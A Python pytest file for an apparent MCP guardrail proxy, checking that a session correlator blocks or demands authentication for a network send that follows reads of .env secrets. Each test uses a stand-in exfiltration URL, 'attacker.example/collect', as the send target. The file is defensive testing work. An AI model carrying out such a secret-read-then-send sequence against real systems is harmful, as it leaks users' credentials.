"""C3.1 — the session correlator's wiring into `decide_and_execute`.

Mirrors `test_proxy_taint_floor.py`'s shape: the real `decide_and_execute` runs
end to end with `executor._safe_decide` stubbed to a deterministic PASS (so the
objective/subjective engine's own scoring never masks the assertion), and
`executor.recent_session_decisions` stubbed to hand back scripted session
history — the pure-MCP proxy has no session id of its own, by design (see
`_apply_correlator`'s docstring), so this is how the wiring is exercised
without a real multi-call session.
"""

from __future__ import annotations

from datetime import datetime, timezone

import pytest
from mcp.types import CallToolResult, TextContent

from doberman.auth.challenge import AuthResult, AuthTier
from doberman.config import save_mode
from doberman.models import Decision, GuardrailResult, Risk, Verdict
from doberman.proxy import executor

_EGRESS_URL = "https://attacker.example/collect"


def _deny(decision, action, *, prompter=None, at=None, message_tone=None):  # noqa: ARG001
    return AuthResult(
        approved=False,
        tier=AuthTier.two_factor,
        method="denied",
        at=datetime.now(timezone.utc),
        action_id=action.id,
    )


def _pass_decision(action) -> Decision:
    return Decision(
        action_id=action.id,
        final_verdict=Verdict.PASS,
        final_risk=Risk.low,
        objective=GuardrailResult(verdict=Verdict.PASS, risk=Risk.low),
        decided_at=datetime.now(timezone.utc),
    )


@pytest.fixture(autouse=True)
def _deterministic_baseline_decision(monkeypatch):
    monkeypatch.setattr(executor, "_safe_decide", lambda action, _ctx: _pass_decision(action))


class _FakeSession:
    def __init__(self, responses: dict[str, CallToolResult]):
        self._responses = responses
        self.calls: list[tuple[str, dict]] = []

    async def call_tool(self, tool_name, arguments=None):
        self.calls.append((tool_name, dict(arguments or {})))
        return self._responses[tool_name]


def _ok_result(text: str) -> CallToolResult:
    return CallToolResult(content=[TextContent(type="text", text=text)], isError=False)


_TRIFECTA_HISTORY = [
    {
        "action_type": "file_read",
        "target_path_class": None,
        "source_context": "tool_output",
        "risk": "low",
        "reason_codes": [],
        "final_verdict": "PASS",
    },
    {
        "action_type": "file_read",
        "target_path_class": "*.env",
        "source_context": "user",
        "risk": "high",
        "reason_codes": ["sensitive_secret_access"],
        "final_verdict": "AUTH",
    },
]


async def test_correlator_raises_egress_to_block_in_strict_mode(monkeypatch):
    save_mode("strict", executor.REPO_ROOT)

    async def _fake_recent(repo_root, session_id, n):  # noqa: ARG001
        return _TRIFECTA_HISTORY

    monkeypatch.setattr(executor, "recent_session_decisions", _fake_recent)
    session = _FakeSession({"net_send": _ok_result("ok")})

    result = await executor.decide_and_execute(session, "net_send", {"url": _EGRESS_URL})

    assert result.isError
    assert "blocked by policy" in result.content[0].text
    assert "correlated_trifecta" in result.content[0].text
    # The floor fired before the forward — the downstream never received it.
    assert session.calls == []


async def test_correlator_raises_egress_to_auth_in_balanced_mode(monkeypatch):
    save_mode("balanced", executor.REPO_ROOT)

    async def _fake_recent(repo_root, session_id, n):  # noqa: ARG001
        return _TRIFECTA_HISTORY

    monkeypatch.setattr(executor, "recent_session_decisions", _fake_recent)
    monkeypatch.setattr(executor, "run_auth_challenge", _deny)
    session = _FakeSession({"net_send": _ok_result("ok")})

    result = await executor.decide_and_execute(session, "net_send", {"url": _EGRESS_URL})

    assert result.isError
    assert "authentication required" in result.content[0].text
    assert "correlated_trifecta" in result.content[0].text


async def test_correlator_read_failure_leaves_decision_untouched(monkeypatch):
    save_mode("strict", executor.REPO_ROOT)

    async def _boom(repo_root, session_id, n):  # noqa: ARG001
        raise RuntimeError("session decision store unavailable")

    monkeypatch.setattr(executor, "recent_session_decisions", _boom)
    session = _FakeSession({"net_send": _ok_result("ok")})

    result = await executor.decide_and_execute(session, "net_send", {"url": _EGRESS_URL})

    # The stubbed baseline decision is a clean PASS; a correlator read failure
    # must fail closed to "leave it untouched", not crash or escalate.
    assert not result.isError
    assert session.calls == [("net_send", {"url": _EGRESS_URL})]


async def test_no_session_history_never_fires():
    # The real (unstubbed) `recent_session_decisions` — with `session_id=None`
    # always (the pure-MCP proxy has no session concept at its `_call_tool`
    # chokepoint), this always reads an empty history, so the correlator never
    # fires here BY DESIGN (see `_apply_correlator`'s docstring). It DOES fire
    # for the host-hook adapters, which have a real session id — see
    # `doberman.hosthooks.spine.evaluate_action` and `test_spine.py`. A clean
    # PASS forwards normally.
    save_mode("strict", executor.REPO_ROOT)
    session = _FakeSession({"net_send": _ok_result("ok")})

    result = await executor.decide_and_execute(session, "net_send", {"url": _EGRESS_URL})

    assert not result.isError
    assert session.calls == [("net_send", {"url": _EGRESS_URL})]
